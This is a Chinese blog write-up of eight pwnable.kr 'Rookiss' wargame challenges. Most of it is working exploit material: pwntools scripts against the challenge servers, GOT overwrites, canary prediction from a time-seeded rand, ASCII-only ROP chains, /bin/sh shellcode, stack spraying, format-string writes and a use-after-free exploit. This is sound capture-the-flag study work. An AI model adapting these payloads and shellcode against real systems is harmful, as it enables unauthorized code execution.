---
layout: post
title: "Pwnable Kr Rookiss Write Up Part One"
---

# 0x00 前言

个人感觉刷题的意义就在于诚意，要做一个言行一致的人。精力暂时有限，本篇文章记录了`pwnable.kr`第二部分`Rookiss`的一半题解，其实做题的套路也渐渐懂一些了：先看安全机制，推测是什么问题，再看程序找出问题点，根据上下文环境确定漏洞利用方式，最后是调试验证。

<!-- more -->

# 0x01 题解

## brain fuck

此题目给我们了.bss段上的一个地址，通过brainfuck功能可以读写一定地址范围内的字节。程序没有开启FULL RELRO还给了bf_libc.so文件，尝试先泄露出函数地址，计算偏移改写GOT表执行shell。但问题是在程序上下文中，没有办法传递`/bin//sh`字符串指针作为`system`函数的参数，考虑使用[one_gadget]来做：

```
$ one_gadget bf_libc.so 
0x3ac5c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac5e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac62 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac69 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbc5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbc6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
```

一般来说在程序中esi不会发生变化，也是指向libc的GOT地址，但栈上或eax还是要满足一定的条件，注意到在程序调用`putchar`的过程中，如果`*(char *)p`为0即可使`[esp] == NULL`：

```
.text:0804863A
.text:0804863A loc_804863A:            ; jumptable 080485FC case 46
.text:0804863A mov     eax, ds:p
.text:0804863F movzx   eax, byte ptr [eax]
.text:08048642 movsx   eax, al
.text:08048645 mov     [esp], eax      ; c
.text:08048648 call    _putchar
.text:0804864D jmp     short loc_804866B ; jumptable 080485FC defaul
```

因为存在延迟绑定，先调用一次`putchar`函数再做泄露，最后定位p至tape地址即可使参数为0，利用脚本如下：

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

libc_elf = ELF('./bf_libc.so')

gdb_init = '''
b *0x08048665
c
'''

putchar_offset = libc_elf.symbols['putchar']
one_gadget_offset = 0x5fbc5 #execl("/bin/sh", eax)
tape_addr = 0x0804A0A0
putchar_got = 0x0804A030

payload = ''
payload += '.' # use putchar
payload += '<' * (tape_addr-putchar_got) # to putchar_got
payload += '.>' * 4 # leak putchar_addr
payload += '<' * 4 # to putchar_got
payload += ',>' * 4 # write one  gadget
payload += '>' *(tape_addr-putchar_got-4)
payload += '[.'

#p = gdb.debug('./bf', gdb_init)
#p = process('./bf')
p = remote('pwnable.kr', 9001)
p.recvuntil('except [ ]\n')
p.sendline(payload)
p.recv(1)
putchar_addr = u32(p.recv(4))
print hex(putchar_addr)
one_gadget_addr = putchar_addr - putchar_offset + one_gadget_offset
print hex(one_gadget_addr)
for c in p32(one_gadget_addr):
    p.send(c)

p.interactive()
```

看看其他[师傅](https://www.cnblogs.com/p4nda/p/7238704.html)是怎么解决`/bin//sh`的问题的，思路就是修改GOT表再次进入`main`函数，劫持`strlen`函数即可。

## md5 calculator

此题目比较明显的问题点是在base64解码过程中造成的栈溢出，但程序开启了Canary和NX，就必须要考虑绕过Canary的[知识]了，一开始根据提示以为是要追逐位爆破Canary，搞了半天不是，转过来发现`my_hash`函数是存在Canary泄露的：

```c
unsigned int my_hash()
{
  signed int i; // [esp+0h] [ebp-38h]
  char v2[4]; // [esp+Ch] [ebp-2Ch]
  int v3; // [esp+10h] [ebp-28h]
  int v4; // [esp+14h] [ebp-24h]
  int v5; // [esp+18h] [ebp-20h]
  int v6; // [esp+1Ch] [ebp-1Ch]
  int v7; // [esp+20h] [ebp-18h]
  int v8; // [esp+24h] [ebp-14h]
  int v9; // [esp+28h] [ebp-10h]
  unsigned int v10; // [esp+2Ch] [ebp-Ch]

  v10 = __readgsdword(0x14u);
  for ( i = 0; i <= 7; ++i )
    *(_DWORD *)&v2[4 * i] = rand();
  return v6 - v8 + v9 + v10 + v4 - v5 + v3 + v7;
}
```

`rand`的种子是`time(NULL)`，那么就不具备随机性了，在程序运行的时可以预测到生成的随机数序列：

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char**argv)
{
    unsigned int i, now;
    scanf("%u", &now);
    srand(now);
    for(i = 0; i < 8; i++)
        printf("%d,", rand());
    printf("\n");
    return 0;
}
```

有了Canary后溢出构造参数`ret2system@plt`即可，利用脚本如下：

```python
import time
import ctypes
import base64
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

print int(time.time())
#p = process('./hash')
now = int(time.time())+1
p = remote('pwnable.kr', 9002)
print now

t = process('/tmp/get_time')
t.sendline(str(now))
v = t.recvline().split(',')
v = ['0', '0'] + v[:-1]
for i in xrange(len(v)):
    v[i] = int(v[i])
t.close()

p.recvline()
captcha = p.recvline().split(':')[1][1:-1]
p.sendline(captcha)
canary = int(captcha)-v[6]+v[8]-v[9]-v[4]+v[5]-v[3]-v[7]
canary = ctypes.c_uint(canary).value
print canary
p.recvline()
p.recvline()

#gdb.attach(p)
payload = ''
payload += 'A'*0x200
payload += p32(canary)
payload += 'B'*0xc
payload += p32(0x08048880) # system plt
payload += 'C'*4
payload += p32(0x0804B3E0) # g_buf
payload = base64.b64encode(payload)
payload += '\x00'*(0x300-len(payload))
payload +=  '/bin//sh'
p.sendline(payload)
p.interactive()
```

## simple login

这道题目比较简单，在`auth`函数中存在溢出可覆盖前一函数`main`的ebp：

```c
_BOOL4 __cdecl auth(int a1)
{
  char v2; // [esp+14h] [ebp-14h]
  char *s2; // [esp+1Ch] [ebp-Ch]
  int v4; // [esp+20h] [ebp-8h]

  memcpy(&v4, &input, a1);
  s2 = (char *)calc_md5(&v2, 12);
  printf("hash : %s\n", (char)s2);
  return strcmp("f87cd601aa7fedca99018a8be88eda34", s2) == 0;
}
```

程序中提供了shell函数，根据`leave; retn`做栈迁移至input全局变量的地址即可，利用脚本如下：

```python
from base64 import b64encode
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

payload = ''
payload += p32(0)
payload += p32(0x08049284)
payload += p32(0x0811EB40)
payload = b64encode(payload)

p = remote('pwnable.kr', 9003)
#p = process('./login')
p.recvuntil('Authenticate : ')
p.sendline(payload)
p.interactive()
```

## otp

这道one time password题目，从源码从汇编从调试来看感觉都没问题，这道题目不是有点脑洞就是有些触及到我的知识盲点了。根据提示可知使用[ulimit](https://www.runoob.com/linux/linux-comm-ulimit.html)限制生成password文件的大小为0，这样文件中保存的随机数就不起效了，自然可以通过验证。直接引用[师傅]的WP，只能说学习了：

```
$ python
Python 2.7.12 (default, Aug 22 2019, 16:36:40) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system('ls')
-  otp	otp.c
0
>>> os.system('./otp 0')
OTP generated.
Congratz!
/bin/cat: flag: No such file or directory
0
>>> 
```

## ascii_easy

此题目通过源码可知道，其映射libc-2.15.so至基址0x5555e000，就是为了让我们用其中纯ascii的gadget构造ROP链，完成代码执行的操作。调试注意到`0x5555e000-0x55702000`的libc-2.15.so是具有可读可写可执行权限的。

思路有三，第一是简单用ROPgadget看看能不能帮我们构造ROP链：

```
$ ROPgadget --offset 0x5555e000 --badbytes "00-1f|80-ff" --ropchain --binary libc-2.15.so > g.txt
$ tail -n 30 g.txt 
0x556a6f2c : xor esi, esi ; ret 0xf01

Unique gadgets found: 5193

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x55687b3c mov dword ptr [edx], edi ; pop esi ; pop edi ; ret
	[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x55635738 mov dword ptr [edx], ecx ; pop ebx ; ret
	[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x5560645c mov dword ptr [edx], eax ; ret
	[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x555e5621 mov dword ptr [ecx], edx ; pop ebx ; ret
	[-] Can't find the 'pop ecx' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x555d6225 mov dword ptr [eax], edx ; ret
	[+] Gadget found: 0x5557506b pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

	[+] Gadget found: 0x55584a58 mov dword ptr [eax], edx ; pop ebx ; pop esi ; pop edi ; ret
	[+] Gadget found: 0x5557506b pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	[-] Can't find the 'pop edx' gadget. Try with another 'mov [reg], reg'

	[-] Can't find the 'mov dword ptr [r32], r32' gadget
```

因为没有`pop edx`而无法使用write4的gadget，看看能不能使用one_gadget跳转一次执行shell：

```
$ one_gadget libc-2.15.so 
0x3ed77 execve("/bin/sh", esp+0x148, environ)
constraints:
  ebx is the GOT address of libc
  [esp+0x148] == NULL

0x6667f execl("/bin/sh", "sh", [esp+0x8])
constraints:
  ebx is the GOT address of libc
  [esp+0x8] == NULL

0x66685 execl("/bin/sh", eax)
constraints:
  ebx is the GOT address of libc
  eax == NULL

0x66689 execl("/bin/sh", [esp+0x4])
constraints:
  ebx is the GOT address of libc
  [esp+0x4] == NULL
```

还是需要是ebx指向GOT的地址，IDA中可知具体为`0x55700FF4`。还是可以找到一些gadget来使用`eax`寄存器和`xchg`操作构造合适的ebx值并跳转至one_gadget地址`0x555c4685`：

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

gdb_init = '''
b *0x08048532
c
'''

payload = ''
payload += 'A'*0x20
payload += p32(0x55615d44) # 0x55615d44 : pop eax ; cmp eax, 0xfffff001 ; jae 0xb7d55 ; ret
payload += p32(0x55706d36) # 0x55706d36 : eax
payload += p32(0x556d2860) # 0x556d2860 : add ah, al ; ret
payload += p32(0x556d2860) # 0x556d2860 : add ah, al ; ret
payload += p32(0x556d2860) # 0x556d2860 : add ah, al ; ret
payload += p32(0x555e7a4c) # 0x555e7a4c : add al, 0x5f ; ret
payload += p32(0x555e7a4c) # 0x555e7a4c : add al, 0x5f ; ret
payload += p32(0x556f6061) # 0x556f6061 : xchg eax, edi ; or cl, byte ptr [esi] ; adc al, 0x43 ; ret
payload += p32(0x55623b42) # 0x55623b42 : xchg ebx, edi ; neg eax ; pop edi ; ret
payload += p32(0x20202020) # 0x20202020 : edi
payload += p32(0x55615d44) # 0x55615d44 : pop eax ; cmp eax, 0xfffff001 ; jae 0xb7d55 ; ret
payload += p32(0x555c4685-8) # 0x555c4685 - 8
payload += p32(0x555f6430) # 0x555f6430 : add eax, 8 ; ret
payload += p32(0x556f6061) # 0x556f6061 : xchg eax, edi ; or cl, byte ptr [esi] ; adc al, 0x43 ; ret
payload += p32(0x555b3670) # 0x555b3670 : xor eax, eax ; add esp, 0xc ; ret
payload += p32(0x20202020) * 3
payload += p32(0x556e2541) # 0x556e2541 : push ecx ; call edi
payload += p32(0x20202020) # 0x20202020 : ecx
p = gdb.debug(['./ascii_easy', payload], gdb_init)
#p = process(['./ascii_easy', payload])
p.interactive()
```

但是在运行过程中触发了异常：

```
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0x55616a0f                  jmp    0x5561697c
   0x55616a14                  mov    eax, DWORD PTR [ebx-0xd4]
   0x55616a1a                  mov    ecx, DWORD PTR [esp+0x1040]
 → 0x55616a21                  mov    eax, DWORD PTR [eax]
   0x55616a23                  mov    DWORD PTR [esp], ecx
   0x55616a26                  mov    DWORD PTR [esp+0x8], eax
   0x55616a2a                  lea    eax, [esp+0x20]
   0x55616a2e                  mov    DWORD PTR [esp+0x4], eax
   0x55616a32                  call   0x556165e0
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ascii_easy", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55616a21 → mov eax, DWORD PTR [eax]
────────────────────────────────────────────────────────────────────────────────
gef➤  x/1xw 0x55700F20
0x55700f20:	0x7361682e
gef➤  x/s 0x55700F20
0x55700f20:	".hash"
gef➤  p $eax
$1 = 0x7361682e
```

在IDA看到功亏一篑就在`execve`之前，`environ_ptr_0`的地址为`0x55700F20`，保存的值为`0x55702e04`，和在程序内存中有的值不一样，就算是有该bss段的地址也没有被映射到内存中：

```
.text:55616A14
.text:55616A14 loc_55616A14:
.text:55616A14 mov     eax, ds:(environ_ptr_0 - 55700FF4h)[ebx]
.text:55616A1A mov     ecx, [esp+103Ch+arg_0]
.text:55616A21 mov     eax, [eax]
.text:55616A23 mov     [esp+103Ch+ptr], ecx
.text:55616A26 mov     [esp+103Ch+var_1034], eax
.text:55616A2A lea     eax, [esp+103Ch+var_101C]
.text:55616A2E mov     [esp+103Ch+size], eax
.text:55616A32 call    execve
.text:55616A37 mov     esi, eax
.text:55616A39 jmp     loc_5561697C
.text:55616A39 ; } // starts at 556168E0
.text:55616A39 execl endp
.text:5561
```

最后一个想法只能是构造ROP链写入shellcode最终再跳转执行了。看到有[前辈](https://blog.csdn.net/charlie_heng/article/details/79316683)是写入一个字符构造`int 0x80`，然后再`read`获取shellcode。其实细心点可以找到类似于write1、write2的gadget来一次性写入所有shellcode：

```
# 0x555f3124 : add byte ptr [edi], cl ; mov ebp, 0x5ff801c0 ; ret
# 0x555e3773 : mov word ptr [edx], ax ; mov eax, edx ; ret
```

如上的edx控制为想写入的地址，al进行一番加减构造为对应shellcode字符即可。执行shellcode前还需将edx至为0（execve的第3个参数），否则会报`0xfffffff2 bad address`的[错误](http://c0de3.me/blog/2015-11-17/src.html)。最终利用脚本如下：

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

gdb_init = '''
b *0x08048532
c
'''

# 0x7f > c - 0x5f - 0x5f > 0x20
# 0x7f + 0xbe > c > 0x5f + 0x7f

def write_one(addr, c):
    w = ''
    w += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret
    w += p32(addr)       # edx
    w += p32(0x20202020) # edi
    w += p32(0x55615d44) # pop eax ; cmp eax, 0xfffff001 ; jae 0xb7d55 ; ret
    if 0x20 <= ord(c) <=0x7f:
        w += c + '\x20\x20\x20' # eax
    elif ord(c) < 0x20:
        t = chr(ord(c)+0x100-0x5f-0x5f)
        w += t + '\x20\x20\x20' # eax
        w += p32(0x555e7a4c) # add al, 0x5f ; ret
        w += p32(0x555e7a4c) # add al, 0x5f ; ret
    elif ord(c) > 0x7f:
        if ord(c)-0x5f <= 0x7f:
            t = chr(ord(c)-0x5f)
            w += t + '\x20\x20\x20' # eax
            w += p32(0x555e7a4c) # add al, 0x5f ; ret
        else:
            t = chr(ord(c)-0x5f-0x5f)
            w += t + '\x20\x20\x20' # eax
            w += p32(0x555e7a4c) # add al, 0x5f ; ret
            w += p32(0x555e7a4c) # add al, 0x5f ; ret
    w += p32(0x555e3773) # mov word ptr [edx], ax ; mov eax, edx ; ret
    return w


shellcode = ''
shellcode += '\x31\xd2' # xor edx, edx
shellcode += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69'
shellcode += '\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'


payload = ''
payload += 'A'*0x20
start_addr = 0x55606055
for i in range(len(shellcode)):
    payload += write_one(start_addr+i, shellcode[i])
payload += p32(start_addr)

p = process(['./ascii_easy', payload])
#p = gdb.debug(['./ascii_easy', payload], gdb_init)
p.interactive()
```

## tiny_easy

这道题目什么安全机制都没开，获取到第一个参数的值并跳转执行：

```
LOAD:08048054 ; Attributes: noreturn
LOAD:08048054
LOAD:08048054                 public start
LOAD:08048054 start           proc near
LOAD:08048054                 pop     eax
LOAD:08048055                 pop     edx
LOAD:08048056                 mov     edx, [edx]
LOAD:08048058                 call    edx
LOAD:08048058 start           endp ; sp-analysis failed
```

常识是执行的程序一般`argv[0]`都是程序本身，属于不可控的内容，但仍可以测试一下execve的第一参数可以为其他值。开始想使用`pwnlib.gdb`的`args`和`exe`参数方便调试，但`pwnlib.gdb.attach`是先起程序获得pid后再attach，`pwnlib.gdb.debug`的gdbserver用的是`args[0]`作为启动程序，而不是传入的`exe`参数，这一点与`pwnlib.tubes.process`的用法不同。最终老老实实写C语言进行调试：

```c
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

int main(void)
{
  char *args[] = {"\x01\x02\x03\x04", "\x05\x06\x07\x08", NULL};

  execve("/home/larry/tools/Rookiss/tiny_easy/tiny_easy", args, NULL);
  printf("error code: %d(%s)\n", errno, strerror(errno));
  return 0;
}
```

既然可以跳到可控地址，剩下的就是栈喷绕过ASLR来盲跳至shellcode当中，模仿[师傅](http://weaponx.site/2017/03/02/tiny-easy-Writeup-pwnable-kr/)的WP，可以设置过多的参数尽量打满栈空间，提高盲跳的命中率：

```python
from pwn import *

shellcode  = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
shellcode += "\x6c\x0e\xff\x01\x80\xe9\x01\x75"
shellcode += "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
shellcode += "\x32\xc1\x51\x69\x30\x30\x74\x69"
shellcode += "\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
shellcode += "\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
payload = "\x90" * 8000 + shellcode

arg = [p32(0xff88ef80)]
for i in range(1,0x100):
    arg.append(payload)
while True:
    p = process(arg, executable="./tiny_easy")
    p.interactive()
```

## fsb

此题目给了源码存在明显的字符串格式化漏洞，但是格式化字符串保存在bss段中，不在栈上就限制了漏洞的直接利用，首先在格式化处下断点看看栈上有哪些可利用的内容：

```
gef➤  x/32xw $esp
0xffef46e0:	0x0804a100	0x0804a100	0x00000064	0x00000000
0xffef46f0:	0x00000000	0x00000000	0x00000000	0x00000000
0xffef4700:	0x00000000	0x08048870	0x00000000	0x00000000
0xffef4710:	0xffef6aa0	0xffef8ff1	0xffef4730	0xffef4734
0xffef4720:	0x00000000	0x00000000	0xffef68c8	0x08048791
0xffef4730:	0x00000000	0x00000000	0x00000000	0x00000000
0xffef4740:	0x00000000	0x00000000	0x00000000	0x00000000
0xffef4750:	0x00000000	0x00000000	0x00000000	0x00000000
gef➤  grep 0x0804A060
[+] Searching '\x60\xA0\x04\x08' in memory
[+] In '/home/larry/tools/Rookiss/fsb/fsb'(0x8048000-0x8049000), permission=r-x
  0x8048687 - 0x8048697  →   "\x60\xA0\x04\x08[...]" 
  0x804871c - 0x804872c  →   "\x60\xA0\x04\x08[...]" 
  0x804874f - 0x804875f  →   "\x60\xA0\x04\x08[...]" 
[+] In '/home/larry/tools/Rookiss/fsb/fsb'(0x8049000-0x804a000), permission=r--
  0x8049687 - 0x8049697  →   "\x60\xA0\x04\x08[...]" 
  0x804971c - 0x804972c  →   "\x60\xA0\x04\x08[...]" 
  0x804974f - 0x804975f  →   "\x60\xA0\x04\x08[...]" 
[+] In '[stack]'(0xff965000-0xff986000), permission=rw-
  0xff9847b4 - 0xff9847c4  →   "\x60\xA0\x04\x08[...]" 
  0xff9847c4 - 0xff9847d4  →   "\x60\xA0\x04\x08[...]" 
```

虽然栈上有前栈帧信息，但也只能算出低几位的key，没有太大意义。可以利用字符串格式化漏洞在栈上写入key的地址`0x0804A060`再读取出key的内容，或者在栈上本来就有固定相对偏移的地方保存着key的地址，也可以读取。正确读取出key的内容时，发现不能通过比较，调试可知`mov edx, eax; sar edx, 1Fh`毁掉了原始输入的4个字节：

```
.text:08048676 call    _strtoull
.text:0804867B mov     edx, eax
.text:0804867D sar     edx, 1Fh
.text:08048680 mov     [ebp+var_30], eax
.text:08048683 mov     [ebp+var_2C], edx
.text:08048686 mov     eax, dword ptr ds:key
.text:0804868B mov     edx, dword ptr ds:key+4
.text:08048691 mov     ecx, edx
.text:08048693 xor     ecx, [ebp+var_2C]
.text:08048696 xor     eax, [ebp+var_30]
.text:08048699 or      eax, ecx
.text:0804869B test    eax, eax
.text:0804869D jnz     short loc_80486
```

既然原始输入会被毁掉，那我毁掉原始的key值总是可以的吧，利用字符串格式化漏洞在栈上写入key地址，再对该地址写入为0，利用脚本如下：

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

gdb_init = '''
b *0x08048610
c
'''

fmt1 = '%' + str(0x0804A060) + 'c%14$n'
fmt2 = '%' + str(0x0804A064) + 'c%15$n'
write1 = '%20$n'
write2 = '%21$n'

#p = gdb.debug('./fsb', gdb_init)
p = process('./fsb')
p.recvuntil(')\n')
p.sendline(fmt1)
p.recvuntil(')\n')
p.sendline(write1)
p.recvuntil(')\n')
p.sendline(fmt2)
p.recvuntil(')\n')
p.sendline(write2)
p.recvuntil('key : \n')
p.sendline('0')
p.interactive()
```

## dragon

此题目开了NX和Canary，程序中提供了`system("/bin/sh");`危险函数调用，仔细分析可知只要攻击获胜就能触发UAF漏洞。因为在`PriestAttack`和`KnightAttack`函数的结尾处均`free`掉了Player结构体，攻击成功后再次调用结构体中保存的函数指针：

```c
    v3 = KnightAttack((int)ptr, v5);
  }
  if ( v3 )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v2 = malloc(0x10u);
    __isoc99_scanf("%16s", v2);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v5)(v5); // v5 is freed in KnightAttack
  }
```

选择的英雄Knight是用蛮力打，Priest可以用魔法打，但正常分析下来均打不过Mama Dragon和Baby Dragon。没有明显的溢出操作，只有游戏人物属性值的加减，自然联想到可能存在整数溢出问题。注意到Mama Dragon的初始单字节HP为80，在`PriestAttack`函数中选择无敌操作，可使其多次回血。而循环判断是有符号的byte比较，多次施法产生溢出即可：

```c
      case 3:
        if ( *(_DWORD *)(a1 + 8) <= 24 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          puts("HolyShield! You Are Temporarily Invincible...");
          printf("But The Dragon Heals %d HP!\n", *((char *)ptr + 9));
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
          *(_DWORD *)(a1 + 8) -= 25;
        }
        break;
      case 1:
        if ( *(_DWORD *)(a1 + 8) <= 9 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          printf("Holy Bolt Deals %d Damage To The Dragon!\n", 20);
          *((_BYTE *)ptr + 8) -= 20;
          *(_DWORD *)(a1 + 8) -= 10;
          printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));
          *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);
          printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);
        }
        break;
    }
    if ( *(_DWORD *)(a1 + 4) <= 0 )
    {
      free(ptr);
      return 0;
    }
  }
  while ( *((_BYTE *)ptr + 8) > 0 );
  free(ptr);
  return 1;
}
```

英雄HP刚好够施法次数的使用，覆盖函数指针为shell函数即可，利用脚本如下：

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

#p = process('./dragon')
p = remote('pwnable.kr', 9004)
p.recvuntil('Knight\n')
p.sendline('1')
for i in xrange(2):
    p.recvuntil('Invincible.\n')
    p.sendline('1')

p.recvuntil('Knight\n')
p.sendline('1')
for i in xrange(4):
    p.recvuntil('Invincible.\n')
    p.sendline('3')
    p.recvuntil('Invincible.\n')
    p.sendline('3')
    p.recvuntil('Invincible.\n')
    p.sendline('2')

p.recvuntil('As:\n')
p.sendline(p32(0x08048DBF)+'A'*12)
p.interactive()
```

# 0x02 总结

题目总体做下来有这样一种感觉：小分题目可能需要些trick和套路，大分题目可能考的是比较正规的漏洞利用知识；同样的道理也适用于这个题目是让你登录系统还是通过网络访问。当然在实际的漏洞利用环境中，一是看信息泄露，然后是对程序内部结构的熟悉掌握，最后是针对漏洞构造有效的利用方式。
